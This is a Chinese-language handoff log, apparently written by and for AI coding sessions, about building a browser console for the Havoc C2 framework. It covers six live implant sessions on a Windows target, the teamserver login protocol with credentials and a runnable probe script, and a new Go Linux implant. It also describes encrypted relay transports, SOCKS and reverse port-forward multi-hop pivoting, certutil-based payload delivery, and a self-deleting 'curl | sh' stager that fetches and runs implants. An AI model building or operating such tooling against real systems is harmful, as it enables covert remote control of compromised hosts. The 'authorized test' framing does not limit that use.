# 交接任务：给 Havoc 0.7 做 Web 控制台（浏览器替代 Qt 客户端）

> 目标读者：下一个会话的 AI/开发者。本文已经过现场侦察，协议结论可直接用。
> 仅用于已获得明确授权的测试环境。

---

## 0. 环境与现状（已验证）

- 主机：Kali `192.168.121.132`；目标 Windows `192.168.121.1`（`ADMIN\Administrator`），当前 **6 个 Demon 会话在线**。
- 部署目录：`/home/kali/桌面/Havoc`
  - `havoc-src/`：Havoc 0.7 源码（已中文化、hexhub 深色主题、监听器面板「一键上线」）
  - `toolchain/`：Go 1.27.3、`venv/bin/cmake`、Qt5 5.15
  - `payloads-out/demon.x64.exe`：一键上线投递的载荷（99,328 字节，回调 `192.168.121.132:8080`）
  - `stager/stager_server.py` + `start-stager.sh`：9901 暂存服务（`/health` `/swt` `/slt` `/payloads/*`）
  - `logs/`：`server-restart.log`、`stager.log`、`client-run.log`
- 启动：
  - Teamserver：`./start-teamserver.sh`（`wss://0.0.0.0:40056`，HTTP 监听 8080）
  - Qt 客户端：`./start-client.sh`
  - 暂存服务：`./start-stager.sh --detach`
- 账号：`5pider / password1234`（**用户名小写敏感**）；客户端库 `havoc-src/data/client.db`
- 监听器：`LAN-Test` → `http://0.0.0.0:8080`，`Hosts=[192.168.121.132]`，配置见 `profiles/havoc.yaotl`
- VShell 参考：`http://127.0.0.1:8890`（**仅本机**，只作 UX 参考，不要复制其代码）

## 1. 目标与边界

**目标**：浏览器（Windows 侧也能访问）完成：登录 → 会话列表/心跳 → 交互控制台（任意命令）→ 事件日志 → 监听器查看；UI 风格对齐 VShell 的 Web 控制台。

**边界**：
- 不改动现有 Qt 客户端的行为，Web 控制台作为增量（独立进程/目录）。
- 不破坏 9901 暂存链路与现有会话。
- 不复制 VShell 的任何代码，只参考交互与布局。

## 2. 关键侦察结论（省去重复摸索）

Havoc 客户端 ↔ Teamserver 的协议是 **JSON over WebSocket 二进制帧**（不是 msgpack）：

- **URL**：`wss://HOST:40056/havoc/`（自签名证书；客户端 `VerifyNone` + `ignoreSslErrors`）
- **帧**：`QWebSocket::sendBinaryMessage( compact JSON )`
- **信封**：

```json
{"Head":{"Event":N,"User":"5pider","Time":"..."},"Body":{"SubEvent":M,"Info":{"k":"v"}}}
```

- **登录**：`Event=1`(InitConnection) `SubEvent=3`(Login)，`Info.User` + `Info.Password`
  - `Password = SHA3-256(明文密码)` 的**小写 hex**
- **登录回执**：`Event=1` `SubEvent=1`(Success) / `2`(Error)
- **事件常量**（`client/src/Havoc/Packager.cc` 顶部）：

| Event | 含义 | SubEvent |
| --- | --- | --- |
| 1 | InitConnection | Success 1 / Error 2 / Login 3 |
| 2 | Listener | Add 1 / Edit 2 / Remove 3 / Mark 4 / Error 5 |
| 4 | Chat | NewMessage 1 / NewListener 2 / NewSession 3 / NewUser 4 / UserDisconnect 5 |
| 5 | Gate | Staged 1 / Stageless 2 |
| 7 | Session | NewSession 1 / Remove 2 / SendCommand 3 / ReceiveCommand 4 / MarkAs 5 |
| 9 | Service | AgentRegister 1 / ListenerRegister 2 |
| 0x10 | Teamserver | Logger 1 / Profile 2 |

- **发命令**：`Event=7` `SubEvent=3`，`Info{ TaskID, CommandLine, DemonID, CommandID, ... }`
  - `shell` 不是单独的 CommandID：客户端走 **PROC 模块**（`CommandID=0x1010`），
    `ProcCommand=4`，`Args="0;FALSE;TRUE;c:\\windows\\system32\\cmd.exe;<base64('/c <命令>')>"`
  - `FS`（dir/cd/pwd/download…）`CommandID=15` + `SubCommand`/`Arguments`
  - 命令构造的权威参考：`client/src/Havoc/Demon/CommandSend.cc`（逐个函数照抄最稳）
- **回包**：`Event=7` `SubEvent=4`（`TaskID`、`Output`…），客户端解析见 `client/src/Havoc/Packager.cc` 的 `DispatchPackage`
- **参考源码**：
  - `client/src/Havoc/Connector.cc`（URL、登录、二进制帧）
  - `client/src/Havoc/Packager.cc`（编解码、常量、分发）
  - `client/src/Havoc/Demon/CommandSend.cc`（每个命令的 Info 字段）
  - `teamserver/cmd/server/dispatch.go`、`teamserver/pkg/events/*`、`teamserver/pkg/agent/commands.go`
- **现成依赖**：本机 `python3` 已有 `websockets 16.0` / `aiohttp 3.13`，**无需安装任何包**。

## 3. 推荐架构（方案 A，最快落地）

```
浏览器 ⇄ webui 网关（Python asyncio：aiohttp 静态/REST/WS）
             ⇄ wss://127.0.0.1:40056/havoc/（以 5pider 登录）
```

- 网关单进程：登录一次，维护会话/监听器/回包缓存；浏览器只连网关。
- 端口 **8081**（8080 监听器、40056 团队服务器、9901 stager、8890 VShell 已占）。
- 备选方案 B：在 Go teamserver 内加 Web 端点（少一跳，但要动核心结构）；**暂不推荐**。

## 4. 分阶段计划与验收

| 阶段 | 内容 | 验收 |
| --- | --- | --- |
| Phase 0（半天） | 写 `webui/probe.py`：登录 + 打印所有事件 | 能收到 `NewSession`/`ReceiveCommand`，看清字段 |
| Phase 1 | 网关核心：登录、状态、`SendCommand`、回包转发；REST `/api/sessions` `/api/events` | 浏览器 REST 能看到 6 个会话 |
| Phase 2 | Web UI：会话表、控制台、监听器、事件流 | 控制台 `shell whoami` 返回 `admin\administrator` |
| Phase 3 | 加固：登录页/会话 cookie、TLS、来源限制、日志、启动脚本 | 未登录不可用；网关重启自动重连 |
| Phase 4（可选） | 文件浏览器、进程列表、监听器增删、一键上线面板迁入 Web | 与 Qt 客户端功能对齐 |

**总验收**：
- 浏览器看到 6 个会话，心跳/状态随 teamserver 刷新；
- Web 控制台 `shell whoami` → `admin\administrator`；`shell net user` 有回显；
- 网关重启能自动重连；不破坏 Qt 客户端与 9901 投递链；
- 异常（断线、超时）有明确提示。

## 5. 已知坑（务必看）

- 用户名 **小写**；密码先 `SHA3-256` 再 hex。
- 自签名证书：网关侧关闭校验（`ssl.CERT_NONE`）。
- 多客户端：teamserver 用 `Clients` map 广播（`EventBroadcast` 排除自己）；测试 Qt 客户端与网关同时在线是否互踢。
- Qt 客户端跑久会 WebSocket 失联（服务端 `Send-Q` 堆积、会话显示 `unresponsive`）：网关必须做重连与超时；必要时重启 teamserver（DB 自动恢复会话）。
- 一键上线：`/swt` → `payloads-out/demon.x64.exe`；**载荷回调地址在生成时烘焙**，不是暂存地址。
- 不要在没有鉴权的情况下把网关绑 `0.0.0.0` 直接暴露到办公网。

## 6. 建议的第一个动作

1. 读 `Connector.cc` + `Packager.cc`（约 30 分钟），确认 JSON 结构；
2. 写 `webui/probe.py`：wss 登录 + 打印事件，先确认字段，再动手 aiohttp；
3. 能稳定收到 `NewSession` 后，再实现 REST/WS 与前端。

`probe.py` 关键片段（可直接跑）：

```python
import asyncio, json, hashlib, ssl, websockets

URL = "wss://127.0.0.1:40056/havoc/"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

async def main():
    async with websockets.connect(URL, ssl=ctx, max_size=None) as ws:
        pwd = hashlib.sha3_256(b"password1234").hexdigest()
        await ws.send(json.dumps({
            "Head": {"Event": 1, "User": "5pider", "Time": ""},
            "Body": {"SubEvent": 3, "Info": {"User": "5pider", "Password": pwd}},
        }, separators=(",", ":")).encode())
        async for msg in ws:
            print(json.loads(msg))

asyncio.run(main())
```

## 7. 当前状态快照（交接时）

- Teamserver 运行中（40056 + 8080），6 个 Demon 会话健康；
- Qt 客户端运行中（可正常交互、文件浏览器）；
- stager 运行中（9901）；
- 若需要重启：`pkill -x Havoc` → 重启 teamserver → `./start-client.sh`（见 README-DEPLOY.md 第 11 节）。

---

## 8. 完成状态（2026-11-07）

Web 控制台位于 `webui/`，与 Qt 客户端、9901 暂存链路并存：

- 启动：`cd webui && ./start-webui.sh`；访问 `http://192.168.121.132:8081/`（`admin` / `havoc1234`）
- **界面复刻 Qt 客户端（hexhub 深色主题）**：菜单栏、会话表、右侧事件查看器、底部 dock 标签页。
- 已实现：登录（HMAC cookie）、会话表 + 心跳、交互控制台、团队聊天、文件浏览器、进程列表、
  监听器增删改、战利品（截图）、团队服务器、会话标记/右键菜单、一键上线、断线重连；
  **载荷生成（Gate Stageless + teamserver 交叉编译 + 下载）**、
  **会话图（PivotParent 树）**、
  **扩展商店（havoc-store + 镜像 + 本地回退，支持 gist/仓库安装）**、
  **Python 脚本与 Python 控制台（SDK：Demon/ConsoleWrite/Command/InlineExecute/BOF 回调、
  RegisterCommand、持久 REPL）**。
- **Demon 命令全量复刻（2026-11-09）**：
  - `help` 与 Qt 客户端结构一致：108 条基线（35 条静态命令 + 73 条模块命令），
    `Command/Type/Description` 列位置 2/27/40，按名称排序；Description 已中文化；`help <cmd> [sub]`、
    `proc help` 输出客户端一致的 Description/Behavior/Usage/Example。
  - 35 条静态命令全部按 `CommandSend.cc` 构造特殊包（FS、Sleep、Checkin、Job、Task、
    Proc、Shellcode、Dll、InlineExecute、Assembly、Net、Pivot、Token、Config、Screenshot、
    Socket、Kerberos、Transfer、Exit）；`commands.py::_build_generic` 保留第三方 Agent
    的 `AgentCommand` 通用路径。
  - `client/config.toml` 的 15 个模块脚本命令（whoami/arp/ipconfig/env/netstat、netGroupList、
    reg_*、sc_*、schtasks*、RemoteOps、nanodump、jump-exec 等）由 Web SDK 执行，BOF 仍经
    teamserver 下发；新增 `DllSpawn` 与 `RegisterModule`。
  - Web 上传（输入框右侧「上传」）→ `inline-execute`/`dll`/`shellcode`/`dotnet`/`upload`；
    Tab 补全、命令历史、Usage 参数提示；`download` 落地到 `data/loot` 并可在战利品下载。
- 验收：`webui/acceptance.py` 15/15；`webui/ui_feature_test.py` 15/15；
  `webui/command_test.py` 34/34（help 108 行、只读命令真实回显、数据包字段、上传执行）；
  载荷生成、BOF、商店安装、监听器增删改、Windows 侧访问均已实测。
- 仍为 Qt 专属：图形化扩展（havocui）运行、部分 SDK API（DllInject/DotnetInlineExecute/
  ProcessCreate/ShellcodeSpawn/RegisterCallback 等）。
- 文档：`webui/README.md`、`README-DEPLOY.md` 第 14 节；截图 `webui/docs/*.png`。


---

## 9. 加密传输监听器（2026-11-09）

监听器页已补齐 VShell 风格的传输与加密（仅改 `webui/`，未动 teamserver/Demon）：

- 模式：`tcp / kcp / udp / ws / dns / doh / dot / oss`（另有原生 http/https）；
- 加密：HTP/1，Vkey HMAC 握手 + AES-256-GCM（EncryptSalt 派生）、zlib、随机填充；
- 中继：`/api/listeners/<name>/relay` 按需交叉编译 Go 中继器（windows/linux × amd64/386/arm64），
  目标上监听 `127.0.0.1:1080`，Havoc HTTP 监听器的「载荷代理」指向它；
- 网关把代理的 absolute-form 请求行改写为 origin-form（`http_rewrite`）；
- 实测：Windows Demon → 中继器 → TCP 加密传输 → 网关 → HTTP 监听器，会话上线且
  `shell whoami` 可用；
- 代码：`webui/transports.py`、`webui/relay_builder.py`、`webui/tools/relay/`、
  `webui/tools/htp_client.py`；测试：`transport_test.py`、`transport_relay_test.py`（各 8/8）；
  文档：`webui/docs/TRANSPORTS.md`、`webui/README.md` 4.5/7.1。

已知边界：KCP 为自有可靠 UDP（非 kcp-go 互通）；DNS/DoH/DoT 由中继器直连监听器；
OSS 为自建 PUT/GET 端点；传输监听器不直接生成 Demon 载荷，必须走「带代理的 HTTP 监听器」。


---

## 10. SMB / External 监听器（2026-11-09）

- 监听器页补齐 Qt 客户端的 `Smb` 与 `External`：
  - SMB：`PipeName`（不绑定端口，写入载荷，由父级 Demon 创建 `\\.\pipe\<name>`，用于枢轴）；
  - External：`Endpoint`（注册到 teamserver `40056` 的 `POST /<endpoint>`；用于第三方 C2/自定义 Agent）；
- 网关按协议构造不同的 ListenerAdd 包；External 端点去重；SMB/External 不支持在线编辑
  （与 teamserver 一致，删除重建）；
- 载荷生成：SMB 可直接生成 Demon 载荷（已实测编译成功，96,768 B）；External 明确拦截并提示；
- **SMB 跳板上线实测**：SMB 监听器 `SMB-Pivot`（pipe `havoc_pipe`）→ SMB 载荷经父会话
  `shell + certutil` 投递并以 `proc create` 启动 → 父会话 `pivot connect localhost havoc_pipe`
  → 子会话 `5a950b74`（`smb-pivot.exe`，PID 2436，pivot_parent=`22c34f3a`）上线，
  `shell whoami` 返回 `admin\administrator`；父会话 `pivot list` 显示
  `5a950b74 -> \\localhost\pipe\havoc_pipe`；
  pivot 子会话的 UI 健康度已修复（任意任务输出即刷新 `last_seen`，不再误报 unresponsive）；
- UI 截图：`webui/docs/listeners-smb-external.png`、`webui/docs/listener-smb-modal.png`、
  `webui/docs/listener-external-modal.png`。


---

## 11. 监听器字段对齐（2026-11-09）

对照 `client/src/UserInterface/Dialogs/Listener.cc` 检查，Web 端补齐了客户端有而 Web 缺的字段：

- **回调主机（Hosts）**：动态多值列表，Add/Clear/逐行删除；为空时回退到 `HostBind`（客户端行为）；
- **请求头（Headers）**：动态多值列表；
- **路径（URI）**：动态多值列表；
- **绑定地址**：与客户端一致改为下拉（teamserver IP + 127.0.0.1 + 0.0.0.0），编辑时只读；
- **HTTP/HTTPS 默认端口**：80 / 443，切换协议自动切换；
- 状态列、代理、HostRotation、HostHeader、SMB/External 均已对齐。

仍存在的差异：
- 默认值：客户端协议默认 HTTPS、Hosts/Headers/URI 初始为空；Web 默认 HTTP 并预填一个 Host/默认 Header/URI（可改）；
- SMB/External 编辑：客户端打开只读弹窗但保存对 teamserver 无效；Web 明确拦截；
- 服务/插件注册的自定义监听器类型（`RegisteredListeners`）：Web 已于 2026-11-10 实现，
  见第 12 节；
- 表格列/弹窗尺寸/按钮文案等 UI 细节：Web 额外展示模式/加密/连接数。

**原生 HTTP 编辑语义（再次确认）**：teamserver `dispatch.go` 的 `Listener.Edit` 只把
User-Agent、Headers、Uris、Proxy 应用到运行中的监听器；`Hosts`、`HostRotation`、
`HostHeader`、`Secure`、`PortBind`/`PortConn`、`HostBind` **不会生效**。Web 已将
绑定地址/端口置灰，并在弹窗与 README 明确提示；需要改这些字段时删除重建。


---

## 12. service/custom listener 收尾（2026-11-10）

P0 已完成：Web 端补齐 teamserver Service 插件注册的自定义监听器协议。

### 12.1 协议链路（已实测）

1. 插件连 `wss://<teamserver>:40056/service-endpoint`，先发
   `{"Head":{"Type":"Register"},"Body":{"Password":"<Service.Password>"}}`；
2. 认证成功后发 `{"Head":{"Type":"Listener"},"Body":{"Type":"ListenerAdd",
   "Listener":{"Name","Agent","Items":[...]}}}`；
3. teamserver `Service.ListenerAdd` 广播 `EV_SERVICE=9 / SubEvent=2`，
   `Info["Listener"]` 为 `ListenerService.Json()` 字符串（`Name`/`Agent`/`Items`）；
4. Web 创建插件监听器时发送原生 `Listener.Add`，`Protocol` 用插件协议名；
   teamserver `dispatch.go` 的 default 分支按 `t.Service.Listeners` 匹配后，
   向插件下发 `{"Head":{"Type":"Listener"},"Body":{"Type":"ListenerStart","Listener":{...}}}`；
5. 插件回执 `ListenerStart`（`Name/Protocol/Host/PortBind/Error/Status/Info`），
   teamserver `ListenerStartNotify` 广播 `Listener.Add`，Web 的 `_wait_listener` 收到回执。

### 12.2 代码改动

- `webui/state.py`
  - 新增 `service_listeners`，解析 `EV_SERVICE/SubEvent=2`（兼容字符串/对象），
    规范化 `Items` 的 `name/text/placeholder/object/required/editable`；
  - `snapshot()` 增加 `service_listeners`，`counts.service_listeners`；
  - `upsert_listener()` 解析 `ListenerStart` 的 `Info` JSON 与 `Host/Port`，
    保留 `service` / `service_fields`，列表可显示插件托管的地址与字段。
- `webui/gateway.py`
  - `POST /api/listeners` 对未知协议先查 `find_service_listener()`，命中则走
    `_add_service_listener()`：`{Name, Protocol, ClientUser, <item.name>...}` 原样透传，
    `required` 后端校验，创建后 `_wait_listener()` 等 2.5s 回执；
  - `PUT /api/listeners/{name}` 对插件监听器明确返回 400（teamserver `ListenerEdit`
    不处理插件协议）；
  - 新增 `GET /api/service-listeners`。
- `webui/static/app.js` / `style.css`
  - 模式下拉新增「服务端插件监听器」分组，按 `Items` 动态生成字段；
  - 编辑时协议禁用、`editable=false` 字段只读，主按钮变「关闭」并提示
    「teamserver 不支持插件在线编辑，请删除后重建」；
  - 表格对插件监听器显示「插件定义」加密、插件托管地址。
- `webui/tools/service_listener_demo.py`：最小服务插件（注册 `Svc-Demo`，
  收到 `ListenerStart` 时真实绑定 TCP 端口并回执），仅用于授权测试。
- `webui/service_listener_test.py`：25 项验收（协议可见、API/UI 创建、
  端口真实监听、必填、编辑拦截、UI 只读语义/删除、回归 LAN-Test/healthy 会话）。

### 12.3 验证结果

```
cd webui
python3 service_listener_test.py   # 25/25 PASS（2026-11-10）
python3 transport_test.py          # 8/8
python3 transport_relay_test.py    # 8/8
python3 acceptance.py              # 15/15
python3 ui_feature_test.py         # 15/15
```

service listener 实测：`Svc-Api-1608027` / `Svc-UI-1608027` 创建后插件分别绑定
`127.0.0.1:46905` / `127.0.0.1:37945`，teamserver 日志出现
`Started "Svc-..." listener`；删除后 Web 列表恢复，`LAN-Test` 与 7 个 healthy 会话不受影响。

### 12.4 已知限制（teamserver 侧，未改上游）

- 插件监听器只存在于 teamserver 内存，不写 `TS_Listeners`（DB 只有 LAN-Test 等原生监听器）；
- `Listener.Edit` 不处理插件协议 → Web 只读展示，改配置需删除重建；
- `Listener.Remove` 只处理 HTTP/External，不通知插件 → 插件端口可能继续占用，直到插件退出；
- teamserver 重放历史事件时，已断开的插件协议可能仍出现在下拉；此时创建会因插件无响应
  返回 502（网关超时），重新注册插件或重启 teamserver 可恢复。
- 截图：`webui/docs/listener-service-modal.png`。


---

## 10. Linux Demon（2026-11-10）

- 新增 `havoc-src/payloads/DemonLinux/`：Go 实现的 Linux agent，协议与 C Demon 完全一致
  （请求大端 / 响应小端、AES-256-CTR），teamserver 新增 `FILETYPE_LINUX_EXE` 与
  `builder/linux.go`（Go 工具链静态编译）。
- Web 载荷对话框格式新增 **Linux Exe**（x64/x86），Windows 专属配置项自动隐藏；
  Qt 客户端 `Payload.cc` 也加入同一选项（已重编 `client/Havoc`，客户端需重启）。
  产物 `demon.x64.elf`（6.1 MB）/ `demon.x86.elf`（6.0 MB），保存在
  `webui/data/payloads/<id>/` 并 `chmod 755`。
- 注册包尾部追加可选 `[platform=2][osName]` → 会话「系统」列显示 `Linux …`，
  `Platform=linux`；Windows Demon 不发送，保持兼容。
- 支持：`shell`、`pwd/cd/ls/dir/cat/rm/mkdir/cp/mv/download/upload`、
  `proc list/grep/kill/create`、`checkin`、`sleep`、`exit`、`screenshot`（X11→PNG 战利品）；
  Web 控制台对 Linux 会话的 `shell` 自动改走 `/bin/sh -c`。
- 监听器：HTTP/HTTPS 直连；tcp/kcp/udp/ws/dns/doh/dot/oss 走「中继器 + HTTP 代理监听器」
  （代理配置烘焙进 ELF，实测 TCP/WS 中继）；SMB/External 不支持（Windows 管道/第三方）。
- SOCKS/端口转发：agent 实现 `COMMAND_SOCKET(2540)`（CONNECT/READ/WRITE/CLOSE +
  RPORTFWD_ADD/LIST/REMOVE/CLEAR）；`socks add` 的 SOCKS5 服务端在 teamserver，
  实测 143 KB 文件经 SOCKS 传输一致；`rportfwd` 目标侧监听 + teamserver 转发，
  受 teamserver `io.Copy` 读模型限制（数据在连接关闭时回传，HTTP 需 `Connection: close`）。
- 多层跳板：Linux 用 `rportfwd` 组链（A→B→C），Hop 监听器 Hosts=上一层、PortConn=上一层的
  rportfwd 端口，UA/URI 与最终监听器一致；agent 已强制 `Connection: close` 以适配 teamserver
  `PortFwdRead` 的 `io.Copy` 语义。三层实测 `4c0b4946`→`4586db9a`→`6c32f405`，
  C 上 `shell id -un` 正常（单命令往返约 20s，sleep 1/层）。
- `webui/linux_compat.py`：把 whoami/env/ipconfig/netstat/arp/... 改写为 Linux 原生命令，
  `help` 对 72 条 Windows 专有命令标注「仅 Windows」，`help <cmd>` 增加 Platform 行。
- 一键上线：9901 新增 `/slt`（POSIX sh，按 `uname -m` 选 x64/x86，setsid 脱离 shell，
  自删除临时文件）；Web/Qt 面板生成 `curl -fsSL <base>/slt | sh`；
  实测从会话 `64670001` 执行该命令 → 新会话 `1ecd5198`，原 shell 任务正常结束。
- 本机验收：x64/x86 均上线（`690b6bc2`/`4bd685d9`），shell/文件/进程/下载上传全通过；
  `acceptance.py` 15/15、`command_test.py` 34/34、`ui_feature_test.py` 14/15
  （唯一失败项是团队聊天历史断言，测试数据依赖，与本次改动无关）。
- 文档：`havoc-src/payloads/DemonLinux/README.md`、`webui/README.md` 4.8/4.12、
  `README-DEPLOY.md` 11.5/14.10。


---

## 13. Linux 命令兼容 + rportfwd 流式化（2026-11-10 收尾）

本轮把「Linux 会话在任意客户端都能用」和「多跳链路不再靠 Connection: close」补齐。

### 13.1 teamserver 侧 Linux 命令兼容（P0）

Qt 客户端把 `whoami/env/ipconfig/...` 实现为 BOF（`COMMAND_INLINEEXECUTE`），
Linux Demon 不能执行 COFF。新增 `teamserver/pkg/agent/linux_compat.go`，
在 `TaskPrepare` 进入命令分支前识别 Linux 会话并改写为原生任务
（与 `webui/linux_compat.py` 同一套语义）：

| 客户端命令 | teamserver 改写 |
| --- | --- |
| `whoami/env/ipconfig/netstat/arp/routeprint/listdns/locale/uptime/resources/userenum/netuser/sessions/quser/nslookup/windowlist` | `COMMAND_PROC(0x1010)` 子命令 4，`/bin/sh -c <等价命令>` |
| `tasklist` | `COMMAND_PROC_LIST(12)`（agent 解析 `/proc`） |
| `net users/localgroup/sessions/domain`（`COMMAND_NET(2100)`） | `/bin/sh -c getent/who/hostname` |

- 只对 Linux 会话生效：`Info.Platform=="linux"`，或重启后从 DB 恢复、
  `OSVersion` 含 `Linux`（`TS_Agents` 旧库没有 Platform 列）；
- 带回调的 BOF（`HasCallback=true`，如 bofbelt）不改写，避免回调丢失；
- `COMMAND_INLINEEXECUTE` 先于原分支返回，Windows 会话完全不受影响
  （实测 Windows `shell whoami` 仍回 `admin\administrator`）。

### 13.2 rportfwd 流式化（P1）

`teamserver/pkg/agent/agent.go`：

- `PortFwdRead` 由 `io.Copy` 改为单次 32 KB `Read`，读到即
  `AddJobToQueue(SOCKET_COMMAND_WRITE)`；
- 新增 `PortFwdEnsureOpen/StartReader/portFwdReadLoop`：`SOCKET_COMMAND_OPEN`
  一到就连目标并启动读循环，不再等客户端先发数据 —— SSH/SMTP 等
  “服务端先说话”的协议可立即收到 banner；
- `PortFwdClose/Write/Read` 用 per-socket mutex 保护 Conn；对端关闭时
  teamserver 主动下发 `SOCKET_COMMAND_CLOSE`，agent 收到 CLOSE 关闭本地连接；
- 修掉控制台刷屏：rportfwd（type=client）的读失败只记 debug，不再打印
  “Failed to read from socks target”。

Linux Demon：移除 `transport.go` 的 `req.Close = true`，恢复 HTTP keep-alive；
`SOCKET_COMMAND_OPEN` 后直接建立目标连接，本地 EOF 时回 CLOSE。

**实测**：

- `rportfwd add 0.0.0.0 18100 127.0.0.1 2222`（真实 sshd）→
  raw TCP 不发送任何数据，1033–2185 ms 内收到 `SSH-2.0-OpenSSH_10.3p1`；
  `ssh -p 18100 127.0.0.1` 正常打印 banner；
- 经 rportfwd 访问 Web 网关：同一 HTTP 连接连续两次 200
  （`/api/health` 43 B + `/static/app.js` 143,322 B），无需 `Connection: close`；
- agent 到 rportfwd 的 TCP 源端口/文件描述符在连续心跳中保持不变（keep-alive 生效）。

### 13.3 会话 Listener 字段（P2）

- `handlers.handleDemonAgent`/`parseAgentRequest` 增加 ListenerName，
  HTTP/External handler 把 `h.Config.Name` 写进 `Agent.Info.Listener`；
- `events.Demons.NewDemon` 不再硬编码 `"Listener":"null"`；
- `Agent.ToMap` 不再把 Listener 置空；
- `TS_Agents` 新增 `Listener`、`Platform` 两列（`db.ensureColumn` 自动迁移旧库），
  `AgentAdd/AgentUpdate/AgentAll` 读写这两列，重启后仍能显示监听器/平台；
- Web 会话表直接显示 `LAN-Test` / `Hop2` 等；多跳会话显示最终落点监听器。

### 13.4 多跳链路修复

`teamserver/cmd/server/teamserver.go` 从 DB 恢复 HTTP 监听器时补回
`PortConn/HostHeader/KillDate/WorkingHours`。此前重启后 Hop2/Hop3 的
`PortConn` 丢失，载荷会退化为直连 `PortBind`，多跳链断掉；现在
`/api/listeners` 重启后仍显示 `Hop2 conn=18080`、`Hop3 conn=18090`、`HopKeep conn=18080`。

### 13.5 新回归脚本

`webui/linux_agent_test.py`：Web 构建临时 Linux Exe → 启动 → 会话上线 →
shell/文件/proc → 原始 WebSocket 下发 Qt 同款包（whoami/tasklist/net users）→
rportfwd banner 计时 → rportfwd HTTP keep-alive → `exit process` 清理，退出码 0。

```
cd webui && python3 linux_agent_test.py   # 20/20 PASS（2026-11-10）
```

### 13.6 三层跳板重跑（新 teamserver）

| 层 | 会话 | 回连 | 结果 |
| --- | --- | --- | --- |
| A | `4c0b4946` | 192.168.121.132:8080 | healthy |
| B | `0ea33e9a` | 127.0.0.1:18080（A rportfwd） | healthy |
| C | `4bcf295f` | 127.0.0.1:18090（B rportfwd） | healthy，`shell id -un; hostname` → `kali` / `bogon` |

Hop2/Hop3 均 `Hosts=127.0.0.1`、`PortConn=18080/18090`，重启 teamserver 后
PortConn 仍在（13.4）。sleep 0 下单命令往返约 1–2 秒。


---

## 14. 会话文件管理器：增删改查（2026-11-10）

此前 Web 文件页只有「列目录 + 下载」，本轮补齐 Windows / Linux 会话的完整文件管理：

### 14.1 能力

- **查**：目录列表（`dir;ui`）、路径栏/上级/刷新、左侧绝对路径树、属性弹窗；
- **增**：新建目录、新建文本文件（可带初始内容）、多选/拖拽上传（单文件 ≤ 32 MiB）；
- **改**：文本编辑（1 MiB 上限，UTF-8/UTF-16/GBK 自动识别，Ctrl+S）、重命名、移动到、复制到；
- **删**：文件/空目录直接 FS `remove`；非空目录可勾选递归删除
  （Linux `rm -rf`；Windows `Remove-Item -Recurse`，失败回退 `rd /s /q`）；
- **下载**：FS `download` → teamserver 落盘 → 网关以附件返回浏览器。

### 14.2 代码

- 新增 `webui/filemanager.py`（约 760 行）：
  - 按会话 `asyncio.Lock` 串行化 FS 操作，规避 teamserver FS 回包无 TaskID 的串台；
  - `_list_core` 对「空目录」做父目录回查兜底（兼容旧 Linux agent 的
    `Failed to enumerate .../*` 与 Windows 偶发无回包）；
  - 相对路径先发 FS `pwd` 解析成绝对路径，文件树不再出现 `.` 根节点；
  - Windows `upload` 是 `CREATE_NEW`：覆盖时先 `mv` 备份，失败回滚、成功删备份；
  - 递归/目录复制通过 shell 打印 `HAVOC_FM_DONE` 判定完成，再列目录复查，
    不再按秒轮询。
- `webui/gateway.py` 新增接口：
  `POST /files/mkdir|remove|move|copy|write|upload`，
  `GET /files/read|download`；`POST /files` 改为等待列表结果并返回 `path+entries`。
- `webui/state.py`：
  - FileExplorer 路径同时剥离 Windows `\*` 与 Linux `/*`（修复 Linux 路径显示 `/tmp/*`）；
  - `Files: null` 的空目录不再触发 `'NoneType' object is not iterable`；
  - 空类型条目规范为 `file`。
- `webui/static/app.js`：文件页重做工具栏/操作列/右键菜单/编辑器/上传拖放；
  文件管理器只信 REST 响应，忽略网关内部校验产生的 `fileexplorer` 广播，
  并对目录请求加序号，防止旧响应覆盖新目录。
- `webui/static/style.css`：文件工具栏、操作列、拖放提示、编辑器、属性/错误样式。
- **agent 修复（需重新生成载荷后生效，旧会话由网关兜底）**：
  - `havoc-src/payloads/DemonLinux/fs.go`：`listRoot` 对存在的空目录返回空 root；
  - `havoc-src/payloads/Demon/src/core/Win32.c`：`listDir` 对空目录返回空 `ROOT_DIR`。

### 14.3 验证

```
cd webui
python3 file_manager_test.py                              # 30/30（Windows 15 + Linux 15）
python3 file_manager_ui_test.py --platform linux          # 14/14
python3 file_manager_ui_test.py --platform windows        # 14/14
```

- `file_manager_test.py`：自动挑选在线 Linux/Windows 会话，覆盖
  新建/重复冲突/新建文件/读/编辑/重命名/复制/冲突/浏览器上传/二进制识别/
  下载/列表/子目录/递归删除/删除确认。
- `file_manager_ui_test.py`：Chromium CDP（默认 `127.0.0.1:9222`）真实点击：
  工具栏、新建目录、进入目录、空目录、新建文件、浏览器上传、右键菜单、
  编辑器加载/保存、删除文件、返回上级、递归删除；`--platform windows` 同样 14 项。
- 实测（1600×1000）：API 30/30；UI Linux 14/14、Windows 14/14；
  截图：`webui/docs/file-manager.png`、`webui/docs/file-manager-windows.png`。

### 14.4 已知边界

- 编辑仅文本（1 MiB）；二进制只下载，不提供 hex 编辑；
- 上传单文件 32 MiB（整包 base64 进 FS upload），大文件仍建议控制台 `upload`/`download`；
- Windows 覆盖写会多 3 个 FS 往返（备份/上传/删备份），高 sleep 会话下较慢；
- 递归删除/目录复制依赖目标上的 PowerShell（Windows）或 `cp`/`rm`（Linux）；
- 列目录失败时无法区分「无权限」和「不存在」，统一按 404/502 返回并显示 agent 原文。
